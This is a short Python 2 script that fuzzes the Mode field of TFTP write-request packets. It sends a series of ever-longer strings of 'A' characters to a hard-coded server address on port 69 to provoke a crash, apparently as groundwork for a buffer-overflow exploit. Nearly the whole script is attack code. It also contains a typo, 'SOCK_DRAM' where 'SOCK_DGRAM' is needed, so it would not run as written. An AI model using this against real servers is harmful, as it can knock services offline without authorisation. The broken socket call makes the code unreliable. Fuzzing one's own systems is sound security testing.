#!/usr/bin/env python
# This script is used to fuzz for a crash in a TFTP server by fuzzing the "Mode" field of a TFTP packet
# REFERENCE: (RFC-1350) https://tools.ietf.org/html/rfc1350
import socket



bufferarray = ["A" * 100]
addition = 200

while len(bufferarray) <= 50:
    bufferarray.append("A" * addition)
    addition += 100
    
for value in bufferarray:
    tftppacket = "\x00\x02" + "a-filename" + "\x00" + value + "\x00"
    print "Fuzzing with length " + str(len(value))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DRAM)
    s.sendto(tftppacket,('192.168.172.10',69))
    response = s.recvfrom(2048)
    print response
